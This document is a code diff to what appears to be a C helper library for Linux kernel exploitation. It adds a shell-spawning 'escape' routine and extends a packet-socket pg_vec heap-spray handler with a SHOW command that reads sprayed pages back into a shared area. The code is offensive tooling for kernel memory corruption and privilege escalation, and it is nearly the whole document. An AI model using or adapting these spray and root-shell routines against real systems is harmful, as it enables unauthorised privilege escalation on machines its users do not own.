@@ -119,6 +119,10 @@ void panic(const char *text){
 }
 void shell(){
     FAIL(getuid(),"[!] Failed to Escape");
+    system("/bin/sh");
+}
+void forkShell(){
+    FAIL(getuid(),"[!] Failed to Escape");
     if(!fork()){
         system("/bin/sh");
     }
@@ -524,7 +528,6 @@ typedef struct pgv_frame{
 }pgvFrame;
 
 pgvFrame pgv[INITIAL_PG_VEC_SPRAY] = {};
-u64 PGV_SHARE_AREA = 0x13200000;
 
 int _pvg_sock(uint32_t size, uint32_t n)
 {
@@ -567,21 +570,14 @@ void _spray_comm_handler()
 {
     ipc_req_t req;
     int32_t result;
-    // typedef struct
-    // {
-    //     enum PG_VEC_CMD cmd;
-    //     int32_t idx;
-    //     size_t order;
-    //     size_t nr;
-    // }ipc_req_t;
     do {
         read(pg_vec_child[0], &req, sizeof(req));
         FAIL_IF(req.idx >= INITIAL_PG_VEC_SPRAY);
         if (req.cmd == ADD)
         {
-            pgv[req.idx].fd = _pvg_sock(PAGE_SIZE * (1<<req.order), req.nr);
+            pgv[req.idx].fd = _pvg_sock(PAGE_SIZE * (1<<req.order), req.arg.nr);
             FAIL(pgv[req.idx].fd <= 0,"[-] PGV not allocated");
-            pgv[req.idx].size = PAGE_SIZE * (1<<req.order) * req.nr ;
+            pgv[req.idx].size = PAGE_SIZE * (1<<req.order) * req.arg.nr ;
         }
         else if (req.cmd == FREE)
         {
@@ -593,14 +589,23 @@ void _spray_comm_handler()
             FAIL(mapped < 0,"[-] FAILED to MAP PGV");
             pgv[req.idx].mapped = mapped;
         }else if(req.cmd == EDIT){
-            size_t fram_size   = PAGE_SIZE * (1<<req.order);
             FAIL( (req.order) > 4, "Fix libx to add this feature!");
+            size_t fram_size   = PAGE_SIZE * (1<<req.order);
             FAIL( pgv[req.idx].fd <= 0 || pgv[req.idx].size < fram_size || pgv[req.idx].mapped == 0 ,"[-] PGV not allocated" );
             size_t target_size = pgv[req.idx].size;
             u64 offset = 0;
             for(offset = 0 ; offset < target_size - fram_size ; offset += fram_size)
                 memcpy(pgv[req.idx].mapped + offset, PGV_SHARE_AREA, fram_size);
-            
+        }else if(req.cmd == SHOW){
+            FAIL( (req.order) > 4, "Fix libx to add this feature!");
+            size_t fram_size   = PAGE_SIZE * (1<<req.order);
+            FAIL( pgv[req.idx].fd <= 0 || pgv[req.idx].size < fram_size || pgv[req.idx].mapped == 0 ,"[-] PGV not allocated" );
+            size_t target_size = pgv[req.idx].size;
+            u64 offset = req.arg.offset;   // In show, nr is the offset to read
+            FAIL( offset >= target_size, "[-] OOB Read");
+            FAIL( offset+fram_size >= target_size, "[-] OOB Read");
+            FAIL( offset+fram_size < offset, "[-] OOB Read");
+            memcpy(PGV_SHARE_AREA, pgv[req.idx].mapped + offset, fram_size);
         }
         result = req.idx;
         write(pg_vec_parent[1], &result, sizeof(result));
@@ -616,7 +621,7 @@ void pgvCmd(enum PG_VEC_CMD cmd, int idx, size_t order, size_t nr)
     req.cmd = cmd;
     req.idx = idx;
     req.order = order;
-    req.nr = nr;
+    req.arg.nr = nr;
     write(pg_vec_child[1], &req, sizeof(req));
     read(pg_vec_parent[0], &result, sizeof(result));
     assert(result == idx);
